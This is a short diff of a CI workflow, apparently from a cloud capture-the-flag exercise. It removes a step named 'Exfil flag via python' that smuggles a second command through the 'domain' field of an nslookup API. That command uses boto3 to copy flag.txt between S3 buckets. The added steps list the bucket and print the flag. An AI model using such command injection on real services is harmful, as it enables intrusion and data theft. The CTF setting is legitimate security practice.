@@ -22,8 +22,5 @@ jobs:
           aws-region: us-east-1
 
 
-      - name: Exfil flag via python
-        run: |
-          curl -s -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
-            -H "Content-Type: application/json" \
-            -d "{\"domain\": \"8.8.8.8; python3 -c 'import boto3; s3=boto3.client(\\\"s3\\\"); data=s3.get_object(Bucket=\\\"codec4f26c862a321ef5\\\",Key=\\\"flag.txt\\\")[\\\"Body\\\"].read(); s3.put_object(Bucket=\\\"platform-bucket-009661764077-us-east-1\\\",Key=\\\"flag.txt\\\",Body=data)'\"}"
+      - run: aws s3 ls s3://platform-bucket-009661764077-us-east-1 --recursive
+      - run: aws s3 cp s3://platform-bucket-009661764077-us-east-1/flag.txt -
